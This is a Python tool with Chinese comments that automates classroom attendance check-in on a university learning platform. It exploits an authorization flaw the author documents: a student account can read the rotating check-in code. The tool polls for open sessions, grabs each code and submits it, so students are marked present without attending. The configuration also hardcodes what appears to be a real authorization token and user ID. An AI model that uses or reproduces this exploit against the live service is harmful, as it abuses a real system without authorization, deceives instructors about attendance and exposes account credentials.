#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
东莞理工 优学院智慧课堂 自动签到工具

===== 逆向结论 (证据在 recon/ 目录) =====
API 根: https://application.dgut.edu.cn/classroomapi
鉴权:   请求头 AUTHORIZATION: <token>

关键接口:
  1. POST /users/login  账号密码登录拿 token (密码 md5 后传输, 无验证码)
  2. GET  /wisdomClassroom/getClassroomActivitys/{classroomId}
     课堂活动列表, status==0 表示签到进行中
  3. GET  /newAttendance/getAttendanceForStu/{attendanceId}/{userId}
     签到详情, status: 0=未签到 1=已签到
  4. GET  /newAttendance/getAttendanceDataCode/{attendanceId}
     ★ 越权漏洞: 学生 token 直接返回当前签到码!
     签到码每 ~6 秒轮换一次, 拿到必须立刻提交
  5. POST /newAttendance/signByStu
     body {"attendanceID":..,"classID":-1,"userID":"..","location":"","enterWay":1,"attendanceCode":"1234"}
     status==200 成功 / 202 活动结束 / 206 码过期
     有限流: 同一 token 约 5 秒内只有第一个 POST 有真实响应 (所以爆破不可行, 也不需要)

===== 用法 =====
  一次性配置: 下面 USERNAME / PASSWORD 填你的优学院账号密码 (或填 TOKEN, 二选一)
  以后每次:
    python signin.py auto "https://lms.dgut.edu.cn/classroom/student.html?classroomId=438380&ocId=161957#/"
    (粘贴老师发的课堂 URL 即可, 挂着就不用管了)
  手动子命令:
    python signin.py code [URL]   # 打印当前签到码
    python signin.py info [URL]   # 查询签到详情
    python signin.py sign 1234    # 手动用指定码签到
"""

import hashlib
import json
import re
import sys
import time

import requests

sys.stdout.reconfigure(encoding="utf-8")
sys.stderr.reconfigure(encoding="utf-8")

# ================== 配置区 (二选一) ==================
USERNAME = ""  # 优学院账号 (学号/手机号)
PASSWORD = ""  # 优学院密码
TOKEN = "7A731F44D518D1FA3D4A47EFB3454C82"  # 或者直接从浏览器抓 AUTHORIZATION 填这里
USER_ID = "13962074"  # 用 TOKEN 方式时需配套填; 账号密码登录会自动获取
CLASSROOM_ID = 438380  # 默认课堂, 命令行发 URL 会被 URL 覆盖
ROUTE_ID = 915256      # 默认签到活动 id, 命令行发 attendence URL 会被覆盖
POLL_INTERVAL = 3      # auto 轮询间隔(秒)
# ===================================================

BASE = "https://application.dgut.edu.cn/classroomapi"


def new_session():
    """新建会话, 直连不走系统代理 (代理慢且并发下大量失败)"""
    s = requests.Session()
    s.trust_env = False
    return s


def headers():
    return {
        "AUTHORIZATION": TOKEN,
        "Content-Type": "application/json;charset=UTF-8",
        "Accept-Language": "zh",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0",
    }


def login(session):
    """账号密码登录, 自动填充 TOKEN / USER_ID"""
    global TOKEN, USER_ID
    payload = {
        "loginName": USERNAME,
        "password": hashlib.md5(PASSWORD.encode("utf-8")).hexdigest(),
        "device": "pc",
        "appVersion": "36",
        "webEnv": "1",
    }
    r = session.post(f"{BASE}/users/login",
                     headers={"Content-Type": "application/json;charset=UTF-8",
                              "Accept-Language": "zh",
                              "User-Agent": "Mozilla/5.0 Chrome/126.0"},
                     json=payload, timeout=10)
    data = r.json()
    res = data.get("result") or {}
    token = res.get("authorization") or res.get("token") or data.get("token")
    uid = res.get("userId") or res.get("userID") or data.get("userId")
    if not token:
        sys.exit(f"[!] 登录失败: {json_dump(data)}\n    检查 USERNAME/PASSWORD, 或改用 TOKEN 方式")
    TOKEN, USER_ID = token, str(uid or USER_ID)
    print(f"[+] 登录成功 (userId={USER_ID})", flush=True)


def ensure_auth(session):
    if not TOKEN and USERNAME and PASSWORD:
        login(session)
    if not TOKEN:
        sys.exit("[!] 没填 TOKEN 也没填 USERNAME/PASSWORD, 见文件头说明")


def parse_ids(arg, current_cid, current_rid):
    """从 URL 或纯数字里解析 classroomId / attendence id"""
    if not arg:
        return current_cid, current_rid
    m = re.search(r"classroomId=(\d+)", arg)
    if m:
        current_cid = int(m.group(1))
    m = re.search(r"attendence/(\d+)", arg)
    if m:
        current_rid = int(m.group(1))
    elif arg.strip().isdigit():
        current_cid = int(arg.strip())
    return current_cid, current_rid


def api_get(session, path):
    r = session.get(f"{BASE}{path}", headers=headers(), timeout=10)
    if not r.text:
        return None  # 被限流, 空 body
    return r.json()


def sign(session, attendance_id, code=""):
    payload = {
        "attendanceID": attendance_id,
        "classID": -1,
        "userID": USER_ID,
        "location": "",
        "enterWay": 1,
        "attendanceCode": code,
    }
    r = session.post(f"{BASE}/newAttendance/signByStu",
                     headers=headers(), json=payload, timeout=10)
    if not r.text:
        return None  # 限流空响应
    return r.json()


def crack_one(session, aid, title=""):
    """取码->立即提交, 失败拿新码重试. 返回 True/False"""
    for attempt in range(10):
        code_resp = session.get(f"{BASE}/newAttendance/getAttendanceDataCode/{aid}",
                                headers=headers(), timeout=10)
        code = code_resp.text.strip()
        if not code.isdigit():
            code = ""  # 非数字码 (如一键签到) 直接空码提交
        res = sign(session, aid, code)
        if res is None:
            time.sleep(1.2)  # 被限流, 缓一下重试
            continue
        st = res.get("status")
        print(f"    [{title or aid}] 尝试{attempt + 1}: 码={code or '(空)'} 响应={json_dump(res)}", flush=True)
        if st == 200:
            print(f"[+] [{title or aid}] 签到成功!", flush=True)
            return True
        if st == 202:
            print(f"[-] [{title or aid}] 活动已结束", flush=True)
            return False
        time.sleep(1.2)  # 206 码过期等: 拿新码再试
    print(f"[-] [{title or aid}] 多次重试仍未成功", flush=True)
    return False


def cmd_auto(cid):
    print(f"[*] 自动监听课堂 {cid} 的新签到, 每 {POLL_INTERVAL}s 轮询, Ctrl+C 退出", flush=True)
    done = set()  # 已处理(签成功/已签过/已结束)的活动
    with new_session() as s:
        ensure_auth(s)
        while True:
            try:
                data = api_get(s, f"/wisdomClassroom/getClassroomActivitys/{cid}")
                if isinstance(data, dict) and data.get("code") in (2001, 2101):
                    if USERNAME and PASSWORD:
                        print("[!] token 过期, 自动重新登录 ...", flush=True)
                        login(s)
                        continue
                    print("[!] token 失效, 且未配置账号密码, 请更新 TOKEN", flush=True)
                    time.sleep(POLL_INTERVAL * 5)
                    continue
                for item in (data or {}).get("list", []):
                    aid = item.get("id")
                    # relationType==1 是签到类活动, status==0 进行中
                    if item.get("relationType") != 1 or item.get("status") != 0 or aid in done:
                        continue
                    title = item.get("title", "")
                    info = api_get(s, f"/newAttendance/getAttendanceForStu/{aid}/{USER_ID}")
                    if info is None:
                        continue
                    if info.get("status") != 0:
                        done.add(aid)  # 已签过
                        continue
                    print(f"[*] 发现进行中的未签到活动: {title} (id={aid}), 立即签到 ...", flush=True)
                    crack_one(s, aid, title)
                    done.add(aid)
            except requests.RequestException as e:
                print(f"[!] 网络异常: {e}", flush=True)
            except (ValueError, AttributeError) as e:
                print(f"[!] 响应异常: {e}", flush=True)
            time.sleep(POLL_INTERVAL)


def cmd_code(rid):
    with new_session() as s:
        ensure_auth(s)
        r = s.get(f"{BASE}/newAttendance/getAttendanceDataCode/{rid}",
                  headers=headers(), timeout=10)
        print(f"[*] 活动 {rid} 当前签到码: {r.text.strip()} (约6秒轮换一次, 要尽快用)")


def cmd_info(rid):
    with new_session() as s:
        ensure_auth(s)
        data = api_get(s, f"/newAttendance/getAttendanceForStu/{rid}/{USER_ID}")
        if isinstance(data, dict) and data.get("code") in (2001, 2101):
            sys.exit("[!] token 无效 —— 更新 TOKEN 或改用账号密码")
        print("[*] 签到活动信息:")
        print(json_dump(data))
        if data and data.get("attendanceID"):
            print(f"\n[+] attendanceID = {data['attendanceID']}, 我的签到状态 status={data.get('status')} (0=未签 1=已签)")


def cmd_sign(rid, code=""):
    with new_session() as s:
        ensure_auth(s)
        info = api_get(s, f"/newAttendance/getAttendanceForStu/{rid}/{USER_ID}")
        aid = (info or {}).get("attendanceID")
        if not aid:
            sys.exit(f"[!] 没拿到 attendanceID, 响应: {json_dump(info)}")
        print(f"[*] attendanceID={aid}, 提交签到码 '{code}' ...")
        res = sign(s, aid, code)
        if res is None:
            sys.exit("[!] 被限流返回空响应, 等 5 秒再试")
        print(f"[*] 响应: {json_dump(res)}")
        judge(res)


def judge(res):
    status = res.get("status")
    if status == 200:
        print("[+] 签到成功!")
    elif status == 202:
        print("[-] 签到活动已结束")
    else:
        print(f"[-] 未成功, status={status}")


def json_dump(d):
    return json.dumps(d, ensure_ascii=False)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit("用法: python signin.py [auto|code|info|sign] [课堂URL] [码]")
    cmd = sys.argv[1]
    cid, rid = parse_ids(sys.argv[2] if len(sys.argv) > 2 else None,
                         CLASSROOM_ID, ROUTE_ID)
    if cmd == "auto":
        cmd_auto(cid)
    elif cmd == "code":
        cmd_code(rid)
    elif cmd == "info":
        cmd_info(rid)
    elif cmd == "sign":
        cmd_sign(rid, sys.argv[3] if len(sys.argv) > 3 else "")
    else:
        sys.exit("用法: python signin.py [auto|code|info|sign] [课堂URL] [码]")
